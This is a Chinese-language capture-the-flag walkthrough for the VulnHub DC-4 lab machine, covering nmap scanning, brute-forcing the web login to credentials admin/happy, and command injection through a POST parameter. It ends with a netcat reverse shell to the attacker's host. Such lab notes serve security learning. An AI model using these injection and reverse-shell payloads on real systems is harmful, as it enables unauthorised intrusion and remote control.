<center>DC-4</center>





[toc]



 [Dvwa](../Dvwa) 



## DC-4

> vulnhub: [dc-4](https://www.vulnhub.com/entry/dc-4,313/)





### 1. 信息收集

```shell
# 扫描网段
nmap -sP 172.16.168.128/24

MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 172.16.168.2
Host is up (0.00025s latency).
MAC Address: 00:50:56:FC:66:6C (VMware)
Nmap scan report for 172.16.168.137

# 全端口扫描
nmap -v -p- --min-rate 5000 -sV -sC 172.16.168.137

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: System Tools
|_http-server-header: nginx/1.15.10
```

> `ip 和端口80：22`







### 2. web端

```shell
# 登陆页面  是否有sql注入，没有其他漏洞就爆破
```

> 打开burp爆破。
>
> 获取用户名和密码`admin/happy`

1. 命令执行

![image-20241129111722807](./assets/image-20241129111722807.png)

> 发送到`Repeater`

```shell
echo $PATH;
# 可以执行的环境变量
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 添加 /bin目录下的可执行的命令
radio=ls -l /bin&submit=Run

#  发现nc可执行，反弹shell
# kali 开启
nc -l -vv -p 8888

# 反弹shell
radio=nc -nv 172.16.168.128 8888 -e /bin/bash&submit=Run

# 获取到shell了
```

